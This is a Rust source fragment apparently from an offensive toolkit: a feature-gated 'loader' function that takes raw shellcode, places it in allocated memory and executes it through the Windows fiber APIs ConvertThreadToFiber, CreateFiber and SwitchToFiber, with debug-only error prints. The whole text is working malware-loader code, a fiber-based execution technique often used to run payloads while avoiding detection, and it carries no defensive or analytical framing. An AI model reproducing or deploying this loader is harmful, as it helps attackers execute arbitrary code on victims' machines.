
#[cfg(feature = "Mei_Fiber")]
pub fn loader(shellcode : Vec<u8>) {
    if shellcode.is_empty() {
        return;
    }

    unsafe {
        let main_fiber = ConvertThreadToFiber(Some(std::ptr::null()));
        if main_fiber.is_null() {
            if cfg!(debug_assertions) {
                println!("ConvertThreadToFiber failed: {:#?}!", GetLastError());
            }
            return;
        }


        let memory = malloc_and_set_memory(shellcode);
        if memory.is_err() {
            if cfg!(debug_assertions) {
                println!("[-] Malloc and set memory failed: {:#?}!", GetLastError());
            }
            return;
        }
        let memory = memory.unwrap();
        if memory.get_ptr() == std::ptr::null_mut() {
            if cfg!(debug_assertions) {
                println!("[-] Get memory pointer failed!");
            }
            return;
        }

        let func = std::mem::transmute(memory.get_ptr());
        let fiber = CreateFiber(0, func, Some(std::ptr::null()));
        if fiber.is_null() {
            if cfg!(debug_assertions) {
                println!("[-]CreateFiber failed: {:#?}!", GetLastError());
            }
            return;
        }

        SwitchToFiber(fiber);
        SwitchToFiber(main_fiber);
    }

}